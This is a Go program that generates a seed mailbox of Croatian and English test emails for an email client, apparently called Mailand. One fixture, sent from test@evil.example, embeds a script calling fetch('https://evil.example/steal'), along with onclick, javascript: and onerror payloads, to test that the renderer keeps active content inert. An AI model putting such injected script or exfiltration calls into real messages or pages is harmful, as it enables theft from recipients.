package main

import (
	"fmt"
	"image/color"
	"math/rand"
	"sort"
	"strings"
	"time"
)

// seedMsg is one message to store: its rendered .eml plus placement.
type seedMsg struct {
	account string
	ts      time.Time
	eml     []byte
	source  string   // folder key of the source mailbox
	labels  []string // additional folder keys (memberships)
	read    bool
	flagged bool
}

var (
	meGmail = addr{"Demo Korisnik", "demo@example.com"}
	meWork  = addr{"Demo Korisnik", "me@work.example"}

	people = []addr{
		{"Ivana Horvat", "ivana.horvat@example.hr"},
		{"Marko Jurić", "marko.juric@example.com"},
		{"Petra Kovačević", "petra.kovacevic@firma.example.hr"},
		{"Đuro Šimunić", "djuro.simunic@example.hr"},
		{"Tomislav Božić", "tomislav@example.org"},
		{"Ana Marić", "ana.maric@gmail.example"},
		{"Luka Matić", "luka.matic@example.com"},
		{"Sarah Miller", "sarah.miller@example.com"},
		{"James Carter", "jcarter@example.co.uk"},
		{"Emily Chen", "emily.chen@example.com"},
		{"", "mirko@example.hr"},
		{"", "noreply@example.com"},
		{"", "info@mala-tvrtka.example.hr"},
		{"Željka Vuković", "zeljka.vukovic@example.hr"},
	}
	services = []addr{
		{"Elektra d.o.o.", "racuni@elektra.example.hr"},
		{"HT Račun", "racun@ht.example.hr"},
		{"Vodovod Zagreb", "obavijesti@vodovod.example.hr"},
		{"Booking Demo", "reservations@booking.example.com"},
		{"CroatiaAir", "tickets@croatiaair.example.com"},
		{"GitHub", "notifications@github.example.com"},
		{"Webshop Ćevapi", "narudzbe@webshop.example.hr"},
	}
	newsletters = []addr{
		{"Tjedni pregled", "pregled@vijesti.example.hr"},
		{"The Morning Digest", "hello@digest.example.com"},
		{"Dev Weekly", "editor@devweekly.example.com"},
	}
)

type topic struct {
	subjects []string
	bodies   []string
	labels   []string // gmail labels
	senders  []addr   // nil = people
	attach   string   // "", "pdf", "xlsx"
}

var topics = []topic{
	{ // Croatian work
		subjects: []string{"Sastanak u četvrtak", "Pitanje oko ugovora", "Ponuda za projekt – rok do petka", "Izvješće za treće tromjesečje", "Raspored dežurstava", "Pregled koda: nova funkcija pretrage"},
		bodies: []string{
			"Bok,\n\nželio bih dogovoriti sastanak u četvrtak u 10 sati. Trebamo proći kroz plan za idući kvartal i raspodijeliti zadatke. Javi mi odgovara li ti termin.\n\nPozdrav,\n%s",
			"Poštovani,\n\nu privitku vam šaljemo ažuriranu ponudu. Molimo vas da nam potvrdite prihvaćanje do petka kako bismo mogli rezervirati kapacitete.\n\nS poštovanjem,\n%s",
			"Bok,\n\npregledao sam promjene i većinom je sve u redu. Još bih čuo tvoje mišljenje o tome kako rješavamo čitanje većih datoteka, čini mi se da možemo bolje. Čujemo se sutra.\n\n%s",
		},
		labels: []string{"posao"},
	},
	{ // English work
		subjects: []string{"Meeting notes: roadmap review", "Quick question about the API", "Design review feedback", "Q3 planning draft", "Re: onboarding checklist", "Release candidate is ready"},
		bodies: []string{
			"Hi,\n\nthanks for the call earlier. Here is a short summary of what we agreed on: ship the beta next week, freeze the schema today, and revisit the pricing page after the review.\n\nLet me know if I missed anything.\n\nBest,\n%s",
			"Hello,\n\nI had a look at the proposal and left a few comments inline. Overall it looks solid, but I'm worried about the migration path for existing users. Could we sync tomorrow?\n\nCheers,\n%s",
			"Hi team,\n\nthe release candidate is built and passing all checks. Please give it a spin on your machines and report anything odd before Friday.\n\nThanks,\n%s",
		},
		labels: []string{"posao"},
	},
	{ // personal Croatian
		subjects: []string{"Vikend u Splitu?", "Fotografije s izleta", "Pozivnica za rođendan", "Večera u subotu", "Jesi li vidio/la ovo?", "Čestitke i pozdravi"},
		bodies: []string{
			"Bok!\n\nJesi li slobodan ovaj vikend? Razmišljamo otići do mora, vrijeme će biti lijepo. Ako želiš, pridruži nam se, imamo još jedno slobodno mjesto u autu.\n\nZagrli sve,\n%s",
			"Evo slika s onog izleta na Plitvice, izašle su prilično dobro. Posebno ona kod slapa, ćeš se nasmijati. Pošalji i ti svoje kad stigneš.\n\n%s",
			"Dragi/a,\n\nu subotu slavimo rođendan pa te lijepo pozivamo da dođeš. Počinjemo oko 19 sati, bit će roštilja, kolača i dobre glazbe. Javi do srijede jesi li s nama.\n\n%s",
		},
	},
	{ // personal English
		subjects: []string{"Long time no see", "Trip photos", "Dinner next week?", "Book recommendation", "Happy birthday!"},
		bodies: []string{
			"Hey!\n\nIt's been ages. How have you been? We should catch up soon, maybe over coffee or a long walk. I have so much to tell you about the new place.\n\nTake care,\n%s",
			"Hi,\n\nattached are the photos from the trip, finally sorted. The sunset ones came out great. Let me know which ones you'd like in full resolution.\n\n%s",
		},
	},
	{ // bills (pdf)
		subjects: []string{"Račun za struju", "Račun za telefon", "Račun za vodu", "Obavijest o dospijeću računa", "Vaš mjesečni račun je spreman"},
		bodies: []string{
			"Poštovani korisniče,\n\nvaš račun za proteklo razdoblje dostupan je u privitku. Iznos za plaćanje: %s EUR, dospijeće za 15 dana. Plaćanje je moguće putem internetskog bankarstva.\n\nHvala što ste s nama.",
		},
		labels:  []string{"racuni"},
		senders: services[:3],
		attach:  "pdf",
	},
	{ // travel
		subjects: []string{"Potvrda rezervacije: Split, 3 noćenja", "Your flight confirmation", "Boarding pass and itinerary", "Raspored putovanja Zagreb–Rijeka", "Check-in opens soon"},
		bodies: []string{
			"Poštovani,\n\npotvrđujemo vašu rezervaciju. Broj rezervacije: %s. Prijava u smještaj moguća je od 14 sati, a odjava do 11 sati. Želimo vam ugodan boravak!",
			"Hello,\n\nyour booking is confirmed. Reference: %s. Please arrive at the airport at least two hours before departure. Online check-in opens 24 hours prior.\n\nHave a great trip!",
		},
		labels:  []string{"travel"},
		senders: services[3:5],
		attach:  "pdf",
	},
	{ // dev notifications
		subjects: []string{"[mailand] New pull request: search improvements", "[mailand] Issue #%d: crash on empty folder", "Security alert: new sign-in", "Your CI build passed"},
		bodies: []string{
			"A new activity was recorded in your repository.\n\nView it on the web: https://github.example.com/demo/mailand/pull/%s\n\nYou are receiving this because you are subscribed to this thread.",
		},
		labels:  []string{"posao"},
		senders: services[5:6],
	},
	{ // webshop / spreadsheets
		subjects: []string{"Vaša narudžba je poslana", "Your order has shipped", "Izvještaj o troškovima za mjesec", "Ponuda – tablica cijena"},
		bodies: []string{
			"Pozdrav,\n\nvaša narudžba %s upravo je predana dostavnoj službi. Očekivana isporuka je za 2 do 3 radna dana. Pratite pošiljku putem poveznice: https://example.com/track/%s\n\nHvala na kupnji!",
		},
		senders: services[6:],
		attach:  "xlsx",
	},
}

// gen holds generation state.
type gen struct {
	r    *rand.Rand
	now  time.Time
	n    int
	msgs []seedMsg
}

func (g *gen) id() string {
	g.n++
	return fmt.Sprintf("seed-%04d@seed.mailand.example", g.n)
}

func pick[T any](r *rand.Rand, xs []T) T { return xs[r.Intn(len(xs))] }

func (g *gen) day(daysAgo int, hour, minute int) time.Time {
	d := g.now.AddDate(0, 0, -daysAgo)
	return time.Date(d.Year(), d.Month(), d.Day(), hour, minute, 0, 0, g.now.Location())
}

// randomTime spreads timestamps over ~18 months, denser recently.
func (g *gen) randomTime() time.Time {
	u := g.r.Float64()
	days := int(548 * u * u)
	t := g.day(days+2, 7+g.r.Intn(14), g.r.Intn(60))
	return t
}

func (g *gen) flags(old bool) (read, flagged bool) {
	read = g.r.Float64() >= 0.36
	if old && g.r.Float64() < 0.2 { // older mail skews read
		read = true
	}
	flagged = g.r.Float64() < 0.06
	return
}

func (g *gen) add(account string, s emlSpec, source string, labels []string, read, flagged bool) {
	m := seedMsg{account: account, ts: s.date, source: source, labels: labels, read: read, flagged: flagged}
	m.eml = buildEML(s, len(g.msgs)+1)
	g.msgs = append(g.msgs, m)
}

// place decides folder placement for a received message of an account.
func (g *gen) place(account string, ts time.Time, extra []string, flagged bool) (string, []string) {
	archived := g.now.Sub(ts) > 60*24*time.Hour && g.r.Float64() < 0.6
	if account == "work" {
		if archived {
			return "archive", nil
		}
		return "inbox", nil
	}
	labels := append([]string{}, extra...)
	if !archived {
		labels = append(labels, "inbox")
	}
	if flagged {
		labels = append(labels, "starred")
	}
	return "all", labels
}

func (g *gen) sentPlace(account string, extra []string) (string, []string) {
	if account == "work" {
		return "sent", nil
	}
	return "all", append([]string{"sent"}, extra...)
}

func me(account string) addr {
	if account == "work" {
		return meWork
	}
	return meGmail
}

func firstName(a addr) string {
	if a.Name == "" {
		return strings.Split(a.Address, "@")[0]
	}
	return strings.Fields(a.Name)[0]
}

func (g *gen) body(t topic, from addr) string {
	b := pick(g.r, t.bodies)
	switch strings.Count(b, "%s") {
	case 2:
		return fmt.Sprintf(b, fmt.Sprintf("%d", 100000+g.r.Intn(900000)), fmt.Sprintf("%d", 100000+g.r.Intn(900000)))
	case 1:
		if t.attach == "pdf" && len(t.labels) > 0 && t.labels[0] == "racuni" {
			return fmt.Sprintf(b, fmt.Sprintf("%d,%02d", 20+g.r.Intn(150), g.r.Intn(100)))
		}
		if len(t.labels) > 0 && t.labels[0] == "travel" {
			return fmt.Sprintf(b, fmt.Sprintf("BK%06d", g.r.Intn(1000000)))
		}
		if t.senders != nil && t.attach == "" {
			return fmt.Sprintf(b, fmt.Sprintf("%d", 1000+g.r.Intn(9000)))
		}
		return fmt.Sprintf(b, firstName(from))
	}
	return b
}

func subjectOf(g *gen, t topic) string {
	s := pick(g.r, t.subjects)
	if strings.Contains(s, "%d") {
		s = fmt.Sprintf(s, 100+g.r.Intn(900))
	}
	return s
}

func (g *gen) attachmentFor(kind string, ts time.Time) []attachment {
	switch kind {
	case "pdf":
		name := fmt.Sprintf("racun_%s_%d.pdf", ts.Format("2006-01"), g.r.Intn(1000))
		return []attachment{{filename: name, mimeType: "application/pdf", data: fakePDF(name, 6000+g.r.Intn(30000))}}
	case "xlsx":
		name := fmt.Sprintf("tablica_%s.xlsx", ts.Format("2006-01"))
		return []attachment{{filename: name, mimeType: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", data: fakeXLSX(8000 + g.r.Intn(20000))}}
	}
	return nil
}

func (g *gen) regular(account string) {
	t := pick(g.r, topics)
	ts := g.randomTime()
	g.regularAt(account, t, ts)
}

func (g *gen) regularAt(account string, t topic, ts time.Time) {
	senders := t.senders
	if senders == nil {
		senders = people
	}
	from := pick(g.r, senders)
	// A fifth of the mail is sent by me instead (only for person-to-person topics).
	if t.senders == nil && g.r.Float64() < 0.2 {
		to := pick(g.r, people)
		src, labels := g.sentPlace(account, t.labels)
		g.add(account, emlSpec{
			id: g.id(), date: ts, from: me(account), to: []addr{to},
			subject: subjectOf(g, t), text: g.body(t, me(account)),
		}, src, labels, true, false)
		return
	}
	read, flagged := g.flags(true)
	src, labels := g.place(account, ts, t.labels, flagged)
	s := emlSpec{
		id: g.id(), date: ts, from: from, to: []addr{me(account)},
		subject: subjectOf(g, t), text: g.body(t, from), attach: g.attachmentFor(t.attach, ts),
	}
	if g.r.Float64() < 0.15 {
		s.cc = []addr{pick(g.r, people)}
	}
	if g.r.Float64() < 0.2 && t.attach == "" {
		s.html = fmt.Sprintf("<html><body style=\"font-family:sans-serif\"><p>%s</p><p><a href=\"https://example.com/\">example.com</a></p></body></html>",
			strings.ReplaceAll(strings.ReplaceAll(s.text, "&", "&amp;"), "\n\n", "</p><p>"))
	}
	g.add(account, s, src, labels, read, flagged)
}

// thread creates a long reply chain ("Re: Re: ...").
func (g *gen) thread(account, subject string, other addr, n int, startDaysAgo int, labels []string, unreadTail bool) {
	var prevBody, prevID string
	var refs []string
	for i := 0; i < n; i++ {
		ts := g.day(startDaysAgo-i*2, 9+g.r.Intn(9), g.r.Intn(60))
		if ts.After(g.now) {
			ts = g.now.Add(-time.Duration(30+i) * time.Minute)
		}
		fromMe := i%2 == 1
		subj := subject
		switch {
		case i == 1:
			subj = "Re: " + subject
		case i >= 2:
			subj = "Re: Re: " + subject
		}
		text := fmt.Sprintf("Bok,\n\n%s",
			pick(g.r, []string{
				"slažem se s prijedlogom, samo bih dodao da trebamo provjeriti rokove prije nego što išta potvrdimo.",
				"hvala na odgovoru. Evo što mislim: prvo riješimo ono što blokira ostale, a ostalo ćemo kad stignemo.",
				"I looked at this again and I think we're mostly aligned. The open point is the schedule; can we settle that this week?",
				"u redu, to mi odgovara. Pošalji mi molim te još jednom detalje da ih proslijedim dalje.",
				"Sorry for the delay! Got swamped. I'll send the updated numbers by tomorrow morning.",
				"super, dogovoreno. Čujemo se čim se nešto promijeni.",
			}))
		if prevBody != "" {
			var q strings.Builder
			for _, l := range strings.Split(prevBody, "\n") {
				q.WriteString("> " + l + "\n")
			}
			prevAuthor := me(account) // the previous message came from the other side
			if fromMe {
				prevAuthor = other
			}
			text += fmt.Sprintf("\n\nNa %s, %s je napisao/la:\n%s", ts.AddDate(0, 0, -2).Format("02.01.2006. u 15:04"), firstName(prevAuthor), q.String())
		}
		id := g.id()
		spec := emlSpec{id: id, date: ts, subject: subj, text: text, inReplyTo: prevID, references: append([]string{}, refs...)}
		if fromMe {
			spec.from, spec.to = me(account), []addr{other}
			src, ls := g.sentPlace(account, labels)
			g.add(account, spec, src, ls, true, false)
		} else {
			spec.from, spec.to = other, []addr{me(account)}
			read := !(unreadTail && i >= n-2)
			src, ls := g.place(account, ts, labels, false)
			if src == "all" && !contains(ls, "inbox") && !read {
				ls = append(ls, "inbox")
			}
			g.add(account, spec, src, ls, read, false)
		}
		prevBody, prevID = text, id
		refs = append(refs, id)
	}
}

func contains(xs []string, s string) bool {
	for _, x := range xs {
		if x == s {
			return true
		}
	}
	return false
}

// ---- special mails -------------------------------------------------------

func (g *gen) newsletter(account string, i int, ts time.Time) {
	from := newsletters[i%len(newsletters)]
	hr := i%3 == 0
	title := "Weekly digest #" + fmt.Sprint(120+i)
	lead := "Here is what happened this week: new releases, a few good reads, and one tool you should try."
	if hr {
		title = fmt.Sprintf("Tjedni pregled br. %d", 40+i)
		lead = "Pregled tjedna: nove vijesti, zanimljivi članci i savjeti za čitanje uz kavu. Ugodno čitanje!"
	}
	html := fmt.Sprintf(`<!DOCTYPE html><html><head><meta charset="utf-8"><style>
body{margin:0;background:#f4f4f4;font-family:Arial,sans-serif;color:#222}
.card{max-width:600px;margin:0 auto;background:#fff;padding:24px}
h1{font-size:22px;color:#1a5fb4} a{color:#1a5fb4}
</style></head><body><div class="card">
<img src="https://cdn.newsletter.example/banner/%d.jpg" width="552" height="140" alt="Banner">
<h1>%s</h1><p>%s</p>
<ul><li><a href="https://example.com/articles/%d">Članak: kako ubrzati svakodnevni rad</a></li>
<li><a href="https://example.com/articles/%d">Why plain text still wins</a></li>
<li><a href="https://example.org/tools/%d">Alat tjedna: šifriranje i čuvanje lozinki</a></li></ul>
<p><a href="https://example.com/unsubscribe?u=%d">Odjava / Unsubscribe</a></p>
<img src="https://track.newsletter.example/open.gif?id=%d" width="1" height="1" style="display:none" alt="">
</div></body></html>`, i, title, lead, i*3, i*3+1, i*3+2, i, 7000+i)
	text := title + "\n\n" + lead + "\n\nhttps://example.com/articles/" + fmt.Sprint(i*3) + "\nhttps://example.com/unsubscribe?u=" + fmt.Sprint(i)
	read := g.r.Float64() > 0.3
	src, labels := g.place(account, ts, nil, false)
	g.add(account, emlSpec{id: g.id(), date: ts, from: from, to: []addr{me(account)}, subject: title, text: text, html: html}, src, labels, read, false)
}

func (g *gen) specials(account string) {
	for i := 0; i < 12; i++ {
		g.newsletter(account, i, g.day(3+i*37%500, 6, 30+i))
	}
	ts := func(d, h int) time.Time { return g.day(d, h, 12) }

	// Inline cid PNG logo.
	logo := makePNG(64, color.RGBA{0x1a, 0x5f, 0xb4, 255}, color.RGBA{0xe0, 0x1b, 0x24, 255})
	for k, d := range []int{1, 20} {
		cid := fmt.Sprintf("logo%d@seed.mailand.example", k)
		html := fmt.Sprintf(`<html><body style="font-family:sans-serif"><p><img src="cid:%s" width="64" height="64" alt="logo"></p>
<h2>Dobrodošli u Mailand</h2><p>Ovo je HTML poruka s ugrađenom (inline) slikom. Čćžšđ test: <b>šđčćž</b>.</p></body></html>`, cid)
		src, labels := g.place(account, ts(d, 10), nil, false)
		g.add(account, emlSpec{id: g.id(), date: ts(d, 10), from: addr{"Mailand Tim", "team@mailand.example"}, to: []addr{me(account)},
			subject: "Dobrodošli – poruka s ugrađenom slikom", text: "Dobrodošli u Mailand. (Slika se vidi samo u HTML prikazu.)", html: html,
			inlines: []attachment{{filename: "logo.png", mimeType: "image/png", data: logo, contentID: cid}}}, src, labels, d != 1, false)
	}

	// Named PDF with non-ASCII filename + xlsx.
	src, labels := g.place(account, ts(2, 9), []string{"racuni"}, false)
	if account == "work" {
		labels = nil
	}
	g.add(account, emlSpec{id: g.id(), date: ts(2, 9), from: services[1], to: []addr{me(account)},
		subject: "Račun za studeni – priložen PDF i tablica", text: "Poštovani,\n\nu privitku se nalazi račun za studeni te tablica s detaljnim stavkama.\n\nHvala.",
		attach: []attachment{
			{filename: "račun_studeni.pdf", mimeType: "application/pdf", data: fakePDF("racun studeni", 24000)},
			{filename: "stavke_studeni.xlsx", mimeType: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", data: fakeXLSX(15000)},
		}}, src, labels, false, false)

	// Active content that must stay inert.
	src, labels = g.place(account, ts(5, 15), nil, false)
	g.add(account, emlSpec{id: g.id(), date: ts(5, 15), from: addr{"Sigurnosni test", "test@evil.example"}, to: []addr{me(account)},
		subject: "Test: skripta i onclick (mora biti neaktivno)", text: "Ova poruka sadrži skriptu i onclick rukovatelj. U prikazu se ne smiju izvršiti.",
		html: `<html><body><h3>Inertni sadržaj</h3>
<script>document.title="PWNED"; document.body.style.background="red"; fetch("https://evil.example/steal")</script>
<button onclick="document.body.innerHTML='PWNED'">Klikni me (onclick)</button>
<a href="javascript:alert(1)">javascript: poveznica</a>
<img src="x" onerror="alert('onerror')">
<p>Ako vidiš ovaj tekst i nikakav alert, sve je u redu.</p></body></html>`}, src, labels, false, false)

	// Links to https URLs.
	src, labels = g.place(account, ts(4, 11), nil, false)
	g.add(account, emlSpec{id: g.id(), date: ts(4, 11), from: pick(g.r, people), to: []addr{me(account)},
		subject: "Korisne poveznice / useful links",
		text:    "Pogledaj ovo:\nhttps://go.dev/doc/\nhttps://doc.qt.io/qt-6/qtwebengine-index.html\nhttps://sr.ht/~sircmpwn/\n",
		html: `<html><body><p>Pogledaj ovo:</p><ul>
<li><a href="https://go.dev/doc/">Go dokumentacija</a></li>
<li><a href="https://doc.qt.io/qt-6/qtwebengine-index.html">Qt WebEngine</a></li>
<li><a href="https://example.com/a?b=1&amp;c=č">Poveznica s upitom</a></li>
<li><a href="mailto:ivana.horvat@example.hr">Pošalji e-poštu</a></li></ul></body></html>`}, src, labels, true, false)

	// Very large HTML mail (> 3 MB).
	var big strings.Builder
	big.WriteString(`<html><body style="font-family:sans-serif"><h2>Godišnje izvješće – kompletni podaci</h2><table border="1" cellpadding="4">`)
	for row := 0; big.Len() < 3300000; row++ {
		fmt.Fprintf(&big, "<tr><td>%d</td><td>Stavka broj %d – šđčćž lorem ipsum dolor sit amet</td><td>%.2f EUR</td></tr>\n", row, row, float64(row)*1.37)
	}
	big.WriteString("</table><p>Kraj izvješća.</p></body></html>")
	src, labels = g.place(account, ts(7, 13), nil, false)
	g.add(account, emlSpec{id: g.id(), date: ts(7, 13), from: pick(g.r, people), to: []addr{me(account)},
		subject: "Godišnje izvješće – vrlo velika poruka (3 MB HTML)", html: big.String()}, src, labels, false, false)
}

// build generates the whole dataset.
func build(now time.Time) []seedMsg {
	g := &gen{r: rand.New(rand.NewSource(20260101)), now: now}

	for i := 0; i < 260; i++ {
		g.regular("gmail")
	}
	for i := 0; i < 50; i++ {
		g.regular("work")
	}
	g.specials("gmail")
	g.specials("work")

	// Today and yesterday.
	for i := 0; i < 5; i++ {
		t := pick(g.r, topics)
		g.regularAt("gmail", t, now.Add(-time.Duration(8+i*9)*time.Minute))
	}
	for i := 0; i < 3; i++ {
		g.regularAt("work", topics[i%2], now.Add(-time.Duration(25+i*11)*time.Minute))
	}
	for i := 0; i < 5; i++ {
		t := pick(g.r, topics)
		g.regularAt("gmail", t, g.day(1, 8+i*3, 5+i))
	}
	g.regularAt("work", topics[0], g.day(1, 16, 40))

	// Long threads.
	g.thread("gmail", "Raspored putovanja i smještaj", people[0], 7, 14, []string{"travel"}, true)
	g.thread("gmail", "Ponuda za projekt", people[2], 9, 40, []string{"posao"}, false)
	g.thread("gmail", "Project handover notes", people[7], 6, 90, []string{"posao"}, false)
	g.thread("work", "Dogovor oko roka isporuke", people[1], 8, 20, nil, true)
	g.thread("work", "Budget approval for Q1", people[8], 6, 120, nil, false)

	// Drafts and spam/trash (Gmail only).
	for i := 0; i < 3; i++ {
		ts := g.day(i*4, 20, 10)
		g.add("gmail", emlSpec{id: g.id(), date: ts, from: meGmail, to: []addr{pick(g.r, people)},
			subject: []string{"Nedovršena poruka", "Draft: ideje za projekt", "Odgovor Ivani (nacrt)"}[i], text: "Počeo sam pisati ali nisam dovršio…"},
			"all", []string{"drafts"}, true, false)
	}
	for i := 0; i < 6; i++ {
		ts := g.day(2+i*9, 3, 30)
		g.add("gmail", emlSpec{id: g.id(), date: ts, from: addr{"", fmt.Sprintf("promo%d@spam.example", i)}, to: []addr{meGmail},
			subject: []string{"POBJEDNIK! Preuzmite nagradu", "Cheap watches 80% off", "Vaš paket čeka – kliknite", "Hot singles in your area", "Kredit bez provjere", "You won the lottery"}[i],
			text:    "Ovo je neželjena poruka. This is spam."}, "spam", nil, i%2 == 0, false)
	}
	for i := 0; i < 5; i++ {
		ts := g.day(5+i*20, 12, 0)
		g.add("gmail", emlSpec{id: g.id(), date: ts, from: pick(g.r, people), to: []addr{meGmail},
			subject: []string{"Staro obavještenje", "Old reminder", "Obrisana poruka", "Nepotrebno", "FYI (deleted)"}[i], text: "Ova je poruka u smeću."}, "trash", nil, true, false)
	}

	sort.SliceStable(g.msgs, func(i, j int) bool { return g.msgs[i].ts.Before(g.msgs[j].ts) })
	return g.msgs
}
